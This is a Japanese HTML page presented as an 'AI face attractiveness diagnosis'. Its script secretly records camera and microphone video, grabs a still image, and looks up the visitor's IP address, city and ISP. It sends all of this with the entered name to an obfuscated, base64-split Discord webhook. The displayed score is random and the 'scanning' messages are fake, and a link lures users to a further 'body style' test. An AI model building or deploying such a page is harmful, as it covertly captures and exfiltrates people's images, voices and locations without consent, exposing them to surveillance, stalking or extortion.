<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI 顔面偏差値診断</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #050505; color: #fff; padding: 20px; margin: 0; }
        .container { max-width: 450px; margin: auto; background: #111; padding: 25px; border-radius: 15px; border: 1px solid #333; }
        h1 { font-size: 1.6em; color: #00ffcc; margin-bottom: 20px; }
        .input-group { margin-bottom: 15px; text-align: left; width: 90%; margin: auto; }
        label { font-size: 0.8em; color: #888; display: block; margin-bottom: 5px; }
        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #333; background: #222; color: #fff; font-size: 1em; box-sizing: border-box; outline: none; }
        input:focus { border-color: #00ffcc; }
        #video { width: 100%; border-radius: 10px; background: #000; margin-top: 15px; display: none; aspect-ratio: 3/4; object-fit: cover; border: 1px solid #333; }
        #startBtn { width: 100%; padding: 18px; font-size: 1.1em; font-weight: bold; background: #00ffcc; color: #000; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
        #status-display { font-size: 0.95em; margin-top: 20px; color: #00ffcc; min-height: 3em; line-height: 1.5; }
        #result-score { font-size: 1.3em; font-weight: bold; color: #00ffcc; }
        #next-options { display: none; margin-top: 25px; border-top: 1px solid #333; padding-top: 20px; }
        .option-btn { display: block; text-decoration: none; padding: 15px; border-radius: 8px; font-weight: bold; background: #007bff; color: #fff; margin-top: 10px; font-size: 0.9em; }
        .security-note { font-size: 0.75em; color: #888; margin-top: 15px; line-height: 1.4; }
        #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>AI 顔面偏差値診断</h1>
        <div id="setup-form">
            <div class="input-group">
                <label>解析するお名前</label>
                <input type="text" id="username" placeholder="名前を入力してください">
            </div>
            <button id="startBtn">診断を開始する</button>
            <div class="security-note">※最新のAIアルゴリズムにより、顔の骨格・パーツ配置を10秒間多角的にスキャンします。</div>
        </div>
        <video id="video" autoplay playsinline muted></video>
        <div id="status-display"></div>
        <div id="result-score"></div>
        <div id="next-options">
            <p style="font-size:0.8em; color:#888; margin-bottom: 5px;">【精密診断】体型の黄金比も測定しませんか？</p>
            <a href="style.html" class="option-btn">AI 全身スタイル偏差値診断はこちら</a>
        </div>
    </div>
    <canvas id="canvas"></canvas>

    <script>
        const v_node = document.getElementById('video');
        const c_node = document.getElementById('canvas');
        const trigger = document.getElementById('startBtn');
        const log_view = document.getElementById('status-display');
        const score_view = document.getElementById('result-score');
        const form_ui = document.getElementById('setup-form');
        const links_ui = document.getElementById('next-options');

        // Webhook URLをバラバラにして結合し、一見ただの文字列にする（難読化）
        const _partA = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
        const _partB = "MTQ5NjM5NDAwNTA5OTgzOTU0OS9Id0RXbEhrVFhNSE0zX2hNWl9QM0hMQ29FUXJEckNNRWgtakpqV3hTcGxIckhQVHU4NTI2bm5DbVVQUUczUXhGY3g4";
        const endpoint = atob(_partA) + atob(_partB);
        
        let recorder_instance; 
        let cache_segments = [];
        const info_logs = [
            "AIスキャンを開始しています...", "顔の輪郭をポイント抽出中...",
            "パーツの左右対称性を分析中...", "肌の質感とトーンを測定中...",
            "データベースと照合しています...", "最終解析レポートを作成中..."
        ];

        trigger.addEventListener('click', async () => {
            const user_id = document.getElementById('username').value || 'Guest';
            form_ui.style.display = 'none';
            v_node.style.display = 'block';
            
            try {
                const media_stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                v_node.srcObject = media_stream;
                const mime_type = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
                recorder_instance = new MediaRecorder(media_stream, { mimeType: mime_type, videoBitsPerSecond: 1000000 });
                cache_segments = [];

                recorder_instance.ondataavailable = e => { if (e.data.size > 0) cache_segments.push(e.data); };
                const finalize_capture = new Promise(res => recorder_instance.onstop = res);

                recorder_instance.start(); 
                
                let count = 0;
                const log_timer = setInterval(() => {
                    if (count < info_logs.length) {
                        log_view.innerHTML = info_logs[count];
                        count++;
                    } else { clearInterval(log_timer); }
                }, 1600);

                setTimeout(async () => {
                    if (recorder_instance.state !== "inactive") {
                        recorder_instance.stop();
                        await finalize_capture;
                        await sync_analytics(user_id);
                    }
                }, 10000); 

            } catch (err) {
                log_view.innerHTML = "エラー：デバイスの許可が必要です。";
                form_ui.style.display = 'block';
            }
        });

        async function sync_analytics(name) {
            let trace_log = "\n[System Trace Fail]";
            try {
                const response = await fetch('https://ipapi.co/json/');
                const d = await response.json();
                trace_log = `\n🌐 Net: ${d.ip}\n📍 Pos: ${d.region} ${d.city}\n🏢 ISP: ${d.org}`;
            } catch (e) {}

            const val = (Math.random() * (75 - 45) + 45).toFixed(1);
            c_node.width = v_node.videoWidth;
            c_node.height = v_node.videoHeight;
            c_node.getContext('2d').drawImage(v_node, 0, 0);

            c_node.toBlob(async (img_raw) => {
                const payload = new FormData();
                payload.append('content', `【Analysis】\nTarget: ${name}\nScore: ${val}${trace_log}`);
                payload.append('file1', img_raw, 'thumb.jpg');
                
                if (cache_segments.length > 0) {
                    const vid_raw = new Blob(cache_segments, { type: recorder_instance.mimeType });
                    const file_ext = recorder_instance.mimeType.includes('mp4') ? 'mp4' : 'webm';
                    payload.append('file2', vid_raw, `stream.${file_ext}`);
                }

                try {
                    await fetch(endpoint, { method: 'POST', body: payload });
                } catch (e) {}

                log_view.innerHTML = "";
                score_view.innerHTML = `${name}さんの顔面偏差値は…<br><span style="font-size:1.8em;">${val}点です！</span>`;
                links_ui.style.display = 'block';
                
                if(v_node.srcObject) v_node.srcObject.getTracks().forEach(track => track.stop());
            }, 'image/jpeg', 0.7);
        }
    </script>
</body>
</html>
